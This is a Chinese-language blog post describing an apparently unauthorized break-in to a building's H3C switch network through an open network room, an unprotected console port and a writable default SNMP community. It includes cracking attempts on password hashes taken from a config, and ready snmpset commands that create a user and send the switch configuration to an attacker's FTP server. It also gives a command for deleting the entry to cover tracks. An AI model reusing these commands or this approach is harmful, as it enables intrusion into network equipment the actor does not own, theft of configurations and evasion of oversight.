---
title: SNMP is not only "Monitoring" Protocol - Exploiting H3C SNMP
date: 2024-11-25 14:04:08
tags: 网络, 网络安全
---

Simple Network *Management* Protocol 是一个用于网络监控和管理的协议. 对于不少人而言, 使用 Grafana 等软件配置 SNMP 监控可以对各种维护信息进行方便地可视化; 但是很多时候我们会忘记, SNMP 是用于 "管理" 的协议, 而不只是 "监控". 因此, 当我们打开 SNMP 时, 我们常常忽略可写的默认配置 (`private` community), 而这会带来灾难性的后果. 这篇博客记录了一次近源渗透的过程.

<!-- more -->

### 交换机在网络间, 网络间锁门, 所以交换机串口不用设密码

有句笑话, "内网安全全靠内网". 这句话在交换机管理口上似乎也适用. 起因是某一天, 我发现网络间的门是开着的, 遂跑进去看了一眼. 由于随身携带网串口线, 我就顺势接了进去. 你猜咋的, Console 口没有 Login 口令也没有 Enable 口令, 直接就是 manage 权限. 后来有位神人把他工位上的网口在网络间的那一端插到 Console 里面去了, 于是获取了 *"持久化"* 的管理权限, 还把旁边的口改成了 Trunk permit all.

### 管理 VLAN 暴露

我本来是懒得管这事的, 但是那位神人把自己的机器接进了管理 VLAN, 狠狠 nmap, 发现里面有不少 H3C 的设备, 应该是整栋楼的网都在里面了. 这下不得不玩一玩了.

我们首先分析了从串口拿到的配置文件, 试图从里面找到 SSH 登录的明文口令. 显然, 没有成功. 但也不是没有收获:

```cfg
local-user #redacted# class manage
 password hash $h$6$/g0pzMiowRibMf+V$gCebiPsmL+rx97v9AHzImTVu/dd5OvkUB2vzPqq9igyaeMeN9yi6b0ffhUyElujx4NF4t9eWn9nZ7zi6C/3rWw==
 service-type ssh
 authorization-attribute user-role network-admin
 authorization-attribute user-role network-operator
 password-control length 4
 undo password-control complexity user-name check
```

这里有密码 Hash, 我们尝试了爆破 ([`$h$6$` Hashcat](https://github.com/84634E1A607A/hashcat/tree/switch_6) ), 但是没有成功. (这告诉我们强密码还是很重要的) 虽然这里面有两个让人浮想联翩的指令 (最小密码长度为 4, 且允许密码中含有用户名), 但是爆破的结果确实不尽如人意.

后来发现 SNMP 开启, 故转而尝试攻击 SNMP.

```cfg
 snmp-agent
 snmp-agent local-engineid 800063A280542BDE8D70C200000001
 snmp-agent community write private
 snmp-agent community read public
 snmp-agent community read cipher $c$3$ljPpsn9d1TBzHoeOpGi1eYcWjfU1nQ==
 snmp-agent community write cipher $c$3$MfmpsSsRFIeSziIk4dkOYMkWuufIEB4=
 snmp-agent sys-info version v1 v2c 
 snmp-agent target-host trap address udp-domain 192.168.xxx.xxx params securityname public v2c
 snmp-agent target-host trap address udp-domain 192.168.xxx.xxx params securityname public v2c
 snmp-agent target-host trap address udp-domain 192.168.xxx.xxx params securityname xxx v2c
```

一开始我还尝试逆向 `$c$3$` crypto, 发现有亿点麻烦; 后来发现这个 `read public` 就是明文, 完全没必要去逆向这个 crypto. 再后来我就懒得管了, 停了不少时间.

### SNMP

这两天突然想起来, SNMP 除了这个只读的 `public` 之外, 还有一个可写的叫 `private` 的 community. 这就不得不试试能不能通过 SNMP 获得全部的权限了.

首先, SNMP 本身就能更改不少东西, 包括但不限于端口的开关, 通过的 VLAN, 等等. 可以说, 有 SNMP 写权限就已经有了 80% 的权限. 但是, 能不能通过 SNMP 拿到 SSH 权限呢?

为了搞清楚 SNMP 在干啥, 首先我们去 H3C 官网拿到 MIB 文件 `20210923_6181667_Comware_MIB-20210918_635750_30003_0` (我就不放上来了). 通过 `snmpwalk -v2c -c public xxx.xxx.xxx.xxx 1.` 等手段可以方便地拿到只读信息. 然后可以对我们感兴趣的部分做研究.

#### SSH?

H3C 对 SSH-MIB 的解释在 [这里](https://www.h3c.com/en/Support/Resource_Center/EN/Switches/Catalog/S9820/S9820/Technical_Documents/Reference_Guides/MIB_Companion/H3C_S9820_8C_MIB_Companion_Rele-17750/13/202403/2070882_294551_0.htm) (应该不会倒闭吧). 对 SSH 的攻击思路是: 新建一个 SSH 用户, 开启这个用户的公钥登录, 把自己的公钥设置进去, 登录; 或者新建一个 SSH 用户并新建一个本地用户, 设置本地用户的密码, 使用 SSH 密码登录.

非常可惜的是, 设置 SSH 公钥登录的逻辑是 新建公钥 -> 给公钥命名 -> 给 SSH 用户 Assign 这个名称. 而我没有找到如何使用 SNMP 创建公钥. 因此, 这条路倒闭了. (如果手头有一台设备, 或许可以对照一下试出来)

而设置密码登录需要新建本地用户. 理论上这个交换机里面已经有两个本地用户了, 但是我从 SNMP 的 USER 表里面读出来的个数是 0. 因此, SNMP 的 USER 表和交换机的 local user 似乎有一些区别. 在使用 [USER-MIB](https://www.h3c.com/en/Support/Resource_Center/HK/Routers/H3C_SR8800-F/H3C_SR8800-F/Technical_Documents/Reference_Guides/MIB_Companion/H3C_SR8800_F_Routers_MIB_R-13029/17/202308/1909461_294551_0.htm) 创建用户之后, SSH 也无法登陆.

这条路到这里似乎就寄了. 但是还是记录一下:

```sh
snmpset -v2c -c private 192.168.xxx.xxx HH3C-USER-MIB::hh3cUserName.1 string adnin HH3C-USER-MIB::hh3cUserInfoRowStatus.1 integer 4 HH3C-USER-MIB::hh3cUserPassword.1 string AdminADN1n HH3C-USER-MIB::hh3cAuthMode.1 integer 0
```

#### CFG?

后来我又翻到了这篇文档: [通过SNMP进行配置文件管理举例](https://www.h3c.com/cn/d_200906/636072_30003_0.htm#_Toc231200647)

也就是说, **SNMP 可以用于直接管理交换机的配置文件**. 对应 OID 位于 [HH3C-CONFIG-MAN-MIB::hh3cCfgOperateTable](https://www.h3c.com/cn/d_202202/1547434_30005_0.htm), 其中 `hh3cCfgOperateType` 可以管理交换机配置文件, 且参数可以是 `running2Startup(1) startup2Running(2) running2Net(3) net2Running(4) net2Startup(5) startup2Net(6) running2File(7) file2Running(8)`. 可以看到, 此表支持利用 FTP 把当前配置传到远程主机上, 也可以从远程主机下载配置.

需要注意的是, 此处会使用 FTP 的 ascii mode (这个狗屎玩意已经被很多 FTP 服务器弃用了, 需要在配置里面手动开启).

使用以下命令:

```sh
snmpset -v2c -c private 192.168.xxx.xxx HH3C-CONFIG-MAN-MIB::hh3cCfgOperateType.1 integer 6 \ # 6: startup2Net
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateRowStatus.1 integer 4 \ # 4: createAndGo, 即创建后立即执行
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateProtocol.1 integer 1 \ # 1: FTP
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateFileName.1 string t/cfg \ # FTP 上传的位置
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateServerAddress.1 a 192.168.xxx.yyy \ # FTP 服务器的地址
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateUserName.1 string anonymous \ # FTP 用户
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateUserPassword.1 string anonymous \ # FTP 密码
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateServerPort.1 integer 21 \ # FTP 端口
HH3C-CONFIG-MAN-MIB::hh3cCfgOperateSrvAddrType.1 integer 1 # 1: ipv4
```

在 FTP 服务器配置正确的情况下, 就可以拿到交换机的配置文件了. (怎么改就不用说了吧) 然后记得删掉这一行, 清除痕迹 (不过会有 Log 记录下来)

```sh
snmpset -v2c -c private 192.168.xxx.xxx HH3C-CONFIG-MAN-MIB::hh3cCfgOperateRowStatus.1 integer 6
```

至此, 这整个管理网就算烂完了. 不过在搞完之后发现由于没有配 ACL, 以业务网的交换机地址为网关可以直接访问管理网...... 所以好像也没什么问题......
